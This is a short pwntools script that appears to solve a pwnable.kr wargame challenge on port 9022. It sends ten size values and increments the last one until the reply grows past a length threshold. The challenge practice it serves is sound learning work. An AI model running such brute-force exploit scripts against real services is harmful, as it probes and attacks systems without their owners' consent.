from pwn import *

intro = 1001
text = 125
flag = 0
input = [8, 16, 32, 69, 133, 261, 517, 1029, 2053, 4096]

while flag == 0:	
	sh = remote('pwnable.kr', 9022)
	
	sh.send(str(input[0]) + '\n')
	sh.send(str(input[1]) + '\n')
	sh.send(str(input[2]) + '\n')
	sh.send(str(input[3]) + '\n')
	sh.send(str(input[4]) + '\n')
	sh.send(str(input[5]) + '\n')
	sh.send(str(input[6]) + '\n')
	sh.send(str(input[7]) + '\n')
	sh.send(str(input[8]) + '\n')
	sh.send(str(input[9]) + '\n')

	output = sh.recvall()
	print(output)
	print(len(output))

	if(len(output) < 2400): #I basically figure out the old output length and round up the 100s
		input[9] += 1 #I change the input placement depending on what I'm looking for
	else:
		flag = 1
	print(input)

print(output)
